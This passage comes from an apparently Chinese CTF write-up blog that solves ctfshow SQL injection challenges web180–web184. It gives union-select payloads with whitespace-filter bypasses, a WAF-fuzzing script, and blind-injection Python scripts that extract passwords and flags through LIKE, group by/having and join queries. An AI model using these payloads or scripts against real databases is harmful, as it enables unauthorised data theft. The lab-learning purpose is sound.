</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web180>web180</h2><p>这里不是很好猜了，写了一个脚本来进行fuzz出waf</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=s2>&#34;admin&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://638fd489-36ef-4f5d-91bb-aad72adb099c.challenge.ctf.show/api&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>repisTrue</span><span class=p>(</span><span class=n>char</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;&#39;&#39;1&#39;and&#39;</span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s1>&#39;=&#39;</span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;?id=&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span> <span class=o>=</span> <span class=n>target</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>w</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>right</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>waf</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span><span class=mi>127</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>repisTrue</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>right</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>i</span><span class=p>,</span> <span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>waf</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>i</span><span class=p>,</span> <span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;right:&#34;</span><span class=p>,</span> <span class=n>right</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;waf:&#34;</span><span class=p>,</span> <span class=n>waf</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;%0cuniOn%0cselEct%0c&#39;</span><span class=mi>1</span><span class=s1>&#39;,&#39;</span><span class=mi>2</span><span class=s1>&#39;,&#39;</span><span class=mi>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;%0cuniOn%0cselEct%0c&#39;</span><span class=mi>1</span><span class=s1>&#39;,database(),&#39;</span><span class=mi>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;%0cuniOn%0cselEct%0c1,(select%0cgroup_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database()),&#39;</span><span class=mi>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;%0cuniOn%0cselEct%0c1,(select%0cgroup_concat(column_name)%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_schema=database()%0cand%0ctable_name=&#39;</span><span class=n>ctfshow_user</span><span class=s1>&#39;),&#39;</span><span class=mi>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;%0cuniOn%0cselEct%0c1,(select%0cgroup_concat(password)%0cfrom%0cctfshow_user%0c),&#39;</span><span class=mi>3</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=web181>web181</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>优先级</th><th>运算符</th></tr></thead><tbody><tr><td>1</td><td><code>:=</code></td></tr><tr><td>2</td><td>||\OR\XOR</td></tr><tr><td>3</td><td><code>&&</code>, <code>AND</code></td></tr><tr><td>4</td><td><code>NOT</code></td></tr><tr><td>5</td><td><code>BETWEEN</code>, <code>CASE</code>, <code>WHEN</code>, <code>THEN</code>, <code>ELSE</code></td></tr><tr><td>6</td><td><code>=</code>, <code>&lt;=></code>, <code>>=</code>, <code>></code>, <code>&lt;=</code>, <code>&lt;</code>, <code>&lt;></code>, <code>!=</code>, <code>IS</code>, <code>LIKE</code>, <code>REGEXP</code>, <code>IN</code></td></tr><tr><td>7</td><td>|</td></tr><tr><td>8</td><td><code>&</code></td></tr><tr><td>9</td><td><code>&lt;&lt;</code>, <code>>></code></td></tr><tr><td>10</td><td><code>-</code>, <code>+</code></td></tr><tr><td>11</td><td><code>*</code>, <code>/</code>, <code>DIV</code>, <code>%</code>, <code>MOD</code></td></tr><tr><td>12</td><td><code>^</code></td></tr><tr><td>13</td><td><code>-</code> (一元减号), <code>~</code> (一元比特反转)</td></tr><tr><td>14</td><td><code>!</code></td></tr><tr><td>15</td><td><code>BINARY</code>, <code>COLLATE</code></td></tr></tbody></table></div><blockquote><p>注：数字越小，优先级越低；数字越大，优先级越高。MySQL中的运算符优先级从低到高排列。</p></blockquote><p>这里很容易看出来我们直接插入<code>username</code>为<code>flag</code>即可获得flag，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>!=</span><span class=s1>&#39;flag&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;-1&#39;</span><span class=o>||</span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;flag&#39;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>说实话我没有看太懂，然后在我们SU的discord里面问了问</p><p><img src=/p/ctfshow-sql-injection/QQ20250430-092023.jpg width=870 height=573 loading=lazy alt=1></p><p>就是这个样子，输入<code>-1'||username='flag</code></p><h2 id=web182>web182</h2><p>过滤了flag利用通配符</p><p><code>-1'||(username)like'fla_</code>或者是<code>-1'||(username)like'fla%</code></p><div class=table-wrapper><table><thead><tr><th>通配符</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td><code>%</code></td><td>匹配零个或多个任意字符</td><td><code>'a%'</code> 匹配所有以a开头的字符串</td></tr><tr><td><code>_</code></td><td>匹配单个任意字符</td><td><code>'a_'</code> 匹配所有以a开头的两个字符长度的字符串</td></tr></tbody></table></div><p>如果需要匹配通配符字符本身（即匹配 <code>%</code> 或 <code>_</code> 字符），可以使用转义符 <code>\</code> 进行转义：</p><div class=table-wrapper><table><thead><tr><th>模式</th><th>说明</th><th>匹配示例</th><th>不匹配示例</th></tr></thead><tbody><tr><td><code>'10\%'</code></td><td>匹配字符串"10%"</td><td>&lsquo;10%&rsquo;</td><td>&lsquo;10&rsquo;, &lsquo;100%&rsquo;</td></tr><tr><td><code>'\_apple'</code></td><td>匹配字符串"_apple"</td><td>&lsquo;_apple&rsquo;</td><td>&lsquo;apple&rsquo;, &lsquo;a_apple&rsquo;</td></tr></tbody></table></div><h2 id=web183>web183</h2><p>利用通配符来匹配</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>pass</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=n>ctfshow_user</span><span class=p>)</span><span class=k>where</span><span class=p>(</span><span class=n>pass</span><span class=p>)</span><span class=k>like</span><span class=s1>&#39;{target+s}%&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>查出来只有一条数据，也就是回显为<code>$user_count = 1;</code>，开始盲注</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://f8df49db-5bb2-442e-8ce6-43929bc95b90.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>strings</span><span class=o>=</span><span class=s2>&#34;1234567890abcdef-}&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;ctfshow{&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>strings</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span><span class=o>=</span><span class=sa>f</span><span class=s2>&#34;(ctfshow_user)where(pass)like&#39;</span><span class=si>{</span><span class=n>target</span><span class=o>+</span><span class=n>s</span><span class=si>}</span><span class=s2>%&#39;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;tableName&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;$user_count = 1;&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span><span class=o>+=</span><span class=n>s</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>s</span> <span class=o>==</span><span class=s2>&#34;}&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web184>web184</h2><p>利用<code>group by</code>对查询结果进行分组，再来筛选，写个脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>pass</span><span class=w> </span><span class=k>having</span><span class=w> </span><span class=n>pass</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=mi>0</span><span class=n>x63746673686f777b25</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://99243179-d071-4d4e-8e0a-8bb4c0177aa9.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;ctfshow{&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>str_to_hex</span><span class=p>(</span><span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>))</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=s1>&#39;0123456789abcdefghijklmnopqrstuvwxyz-</span><span class=si>{}</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;ctfshow_user group by pass having pass like 0x</span><span class=si>{0}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>str_to_hex</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=n>j</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;tableName&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(r.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;$user_count = 1;&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>target</span><span class=p>)</span> <span class=o>==</span> <span class=mi>44</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=s1>&#39;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>也可以利用内连接\左连接\右连接</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>inner</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>pass</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=mi>0</span><span class=n>x63746673686f777b25</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>right</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>pass</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=mi>0</span><span class=n>x63746673686f777b25</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>left</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>ctfshow_user</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>pass</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=mi>0</span><span class=n>x63746673686f777b25</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>写出三个脚本(练习为主)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://99243179-d071-4d4e-8e0a-8bb4c0177aa9.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;ctfshow{&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>str_to_hex</span><span class=p>(</span><span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>))</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=s1>&#39;0123456789abcdefghijklmnopqrstuvwxyz-</span><span class=si>{}</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;ctfshow_user a inner join ctfshow_user b on b.pass like 0x</span><span class=si>{0}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>str_to_hex</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=n>j</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;tableName&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(r.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;$user_count = 22;&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>target</span><span class=p>)</span> <span class=o>==</span> <span class=mi>44</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=s1>&#39;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://99243179-d071-4d4e-8e0a-8bb4c0177aa9.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;ctfshow{&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>str_to_hex</span><span class=p>(</span><span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>))</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=s1>&#39;0123456789abcdefghijklmnopqrstuvwxyz-</span><span class=si>{}</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;ctfshow_user a right join ctfshow_user b on b.pass like 0x</span><span class=si>{0}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>str_to_hex</span><span class=p>(</span><span class=n>target</span> <span class=o>+</span> <span class=n>j</span> <span class=o>+</span> <span class=s1>&#39;%&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;tableName&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
